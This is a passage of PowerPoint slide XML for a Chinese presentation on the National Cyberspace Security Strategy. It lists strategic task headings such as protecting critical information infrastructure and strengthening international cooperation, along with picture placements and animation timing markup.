              <a:rPr lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>中国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>国家网络空间安全战略</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2215" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="32" name="图片 31"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5140142" y="847950"/>
            <a:ext cx="3608322" cy="2085975"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8951387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fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="16"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="23" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="16"/>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additive="base">
                                        <p:cTn id="38" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="24"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="39" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="24"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_h/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="40" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="41" presetID="53" presetClass="entr" presetSubtype="16"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500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="25"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="44" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="25"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="45" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="25"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="46" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="1000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="47" presetID="5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animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="51" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="26"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="52" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="1500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="53" presetID="53" presetClass="entr" presetSubtype="16" fill="hold" grpId="0" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="54" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="27"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="55" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="27"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="56" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="27"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="57" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="27"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="58" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="2000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="59" presetID="53" presetClass="entr" presetSubtype="16" fill="hold" grpId="0" nodeType="after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p:cTn id="61" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="28"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="62" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="28"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="6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5" grpId="0" animBg="1"/>
      <p:bldP spid="26" grpId="0" animBg="1"/>
      <p:bldP spid="27" grpId="0" animBg="1"/>
      <p:bldP spid="28"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918977" y="1536054"/>
            <a:ext cx="2880320" cy="969743"/>
            <a:chOff x="381000" y="1412776"/>
            <a:chExt cx="2880320" cy="969743"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="对角圆角矩形 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1059234" y="1897647"/>
              <a:ext cx="2202086" cy="432048"/>
            </a:xfrm>
            <a:prstGeom prst="round2Diag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2400" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>大战略任务</a:t>
              </a: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 y="1412776"/>
              <a:ext cx="969743" cy="969743"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="矩形 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4317890" y="2042264"/>
            <a:ext cx="2769178"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坚定捍卫网络空间主权</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="矩形 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4317889" y="2483604"/>
            <a:ext cx="2769179"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坚决维护国家安全</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="矩形 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4322155" y="2915652"/>
            <a:ext cx="2764914"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保护关键信息基础设施</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="矩形 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4317890" y="3347700"/>
            <a:ext cx="2769179"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加强网络文化建设</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="矩形 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4317889" y="3779748"/>
            <a:ext cx="2769180"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打击网络恐怖和违法犯罪</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="矩形 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4317889" y="4211796"/>
            <a:ext cx="2769177"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完善网络治理体系</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="矩形 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4317889" y="4643844"/>
            <a:ext cx="2769177"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夯实网络安全基础</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="矩形 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4317889" y="5075892"/>
            <a:ext cx="2769177"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提升网络空间防护能力</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="矩形 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4317889" y="5507940"/>
            <a:ext cx="2774391"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强化网络空间国际合作</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="矩形 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="317989" y="902677"/>
            <a:ext cx="4179349" cy="433196"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>中国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>《</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2215" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>国家网络空间安全战略</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2215" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>》</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2215" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="22" name="图片 21"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="788413" y="2990668"/>
            <a:ext cx="3238500" cy="2547927"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13455978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1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="12"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="19" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="12"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="20" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="12"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="21" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="2000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="22" presetID="53" presetClass="entr" presetSubtype="16"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1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="13"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="25" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="13"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="26" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="13"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="27" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="3000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="28" presetID="53" presetClass="entr" presetSubtype="16"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p:cTn id="30" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="14"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="31" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="14"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="14"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="33" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="4000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="34" presetID="53" presetClass="entr" presetSubtype="16"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1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="15"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="37" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="15"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="38" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="15"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="39" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="5000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="40" presetID="53" presetClass="entr" presetSubtype="16"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p:cTn id="42" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="16"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="43" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="16"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="44" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="16"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="45" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="6000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="46" presetID="53" presetClass="entr" presetSubtype="16" fill="hold" grpId="0" nodeType="after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p:cTn id="48" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="17"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="49" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="17"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="50" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="17"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="51" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="7000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="52" presetID="53" presetClass="entr" presetSubtype="16" fill="hold" grpId="0" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="53" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
